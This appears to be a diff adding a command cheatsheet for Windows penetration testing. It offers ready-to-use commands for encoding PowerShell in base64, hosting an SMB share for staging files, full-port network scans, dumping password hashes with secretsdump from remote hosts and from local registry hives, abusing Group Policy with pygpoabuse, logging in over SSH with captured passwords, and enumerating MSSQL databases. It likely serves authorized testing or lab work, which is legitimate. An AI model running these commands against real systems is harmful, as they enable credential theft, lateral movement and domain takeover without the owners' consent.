@@ -1,0 +1,76 @@
+% powershell encoded
+# Convert to an encoded powershell command
+iconv -t utf-16le | base64 -w 0 | (echo -n 'powershell -enc '; cat; echo)
+
+% samba server, smb server
+# Start a tmp samba server
+docker run --rm -it -p 139:139 -p 445:445 -v $(pwd):/mount dperson/samba -s 'tmp;/mount;no;no;yes;tmp;tmp' -u "tmp;tmp"
+
+# Start a configured SMB server
+docker run --rm -it -p 139:139 -p 445:445 -v $(pwd):/mount dperson/samba -s '<sharename>;/mount;no;no;yes;<share_username>;<share_username>' -u "<share_username>;<share_password>"
+
+% net use
+# Net use a SMB share
+net use Z: <smb_path>
+
+% net use with credentials
+# Net use a SMB share
+net use Z: <smb_path> /user:<user> <password>
+
+% psdrive
+# Connect a PS drive
+$username = "<user>"
+$password = ConvertTo-SecureString "<password>" -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential($username, $password)
+New-PSDrive -Name "<drive_letter>" -PSProvider FileSystem -Root "<smb_path>" -Credential $cred
+
+$ interface: ip link show | awk -F': ' '{print $2}' | grep .
+$ external_ip: ip -f inet addr show <interface> | awk '/inet / {print $2}' | cut -d'/' -f1
+$ smb_path: echo '\\'"<external_ip>"'\'"<sharename>"
+
+% nmap windows
+# Nmap TCP targets from windows.yaml
+mkdir -p nmap && sudo nmap -v -p- -sC -sV -oA nmap/tcp $(yq '.hosts[].ip' windows.yaml)
+
+% rustscan windows
+# Rustscan TCP targets from windows.yaml
+windows-yaml.sh writelist && sudo rustscan -r 1-65535 --ulimit 5000 -a .ips -- -v -sC -sV | tee rustscan-tcp.log
+
+# Nmap UDP targets from windows.yaml
+mkdir -p nmap && sudo nmap -v -p- -sU -sC -sV -oA nmap/udp $(yq '.hosts[].ip' windows.yaml)
+
+# Rustscan UDP targets from windows.yaml
+windows-yaml.sh writelist && sudo rustscan -r 1-65535 --ulimit 5000 -a .ips --udp -- -v -sC -sV | tee rustscan-udp.log
+
+% secretsdump
+@ windows-variables
+# secretsdump
+secretsdump.py '<user_with_password>:<password_for_user>@<fqdn>'
+
+# secretsdump local
+secretsdump.py -sam '<sampath>' -security '<secpath>' -system '<syspath>' LOCAL
+$ sampath: find . -type f
+$ secpath: find . -type f
+$ syspath: find . -type f
+
+% pygpoabuse
+@ windows-variables
+# pygpoabuse
+pygpoabuse.py '<domain>/<user_with_password>:<password_for_user>' -gpo-id '<gpo_id>'
+
+% windows ssh
+@ windows-variables
+# ssh with windows creds
+sshpass -p '<password_for_user>' ssh '<user_with_password>'@'<ip_or_fqdn>'
+
+% mssql
+# mssql query
+<sqlcmdstarter> -Q "<query>"
+
+# mssql list databases
+<sqlcmdstarter> -Q "SELECT name FROM sys.databases"
+
+# mssql list tables in database
+<sqlcmdstarter> -d "<dbname>" -Q "SELECT name FROM sys.tables"
+
+$ sqlcmdstarter: echo 'sqlcmd.exe -S localhost\SQLEXPRESS -U <user> -P <pass>'
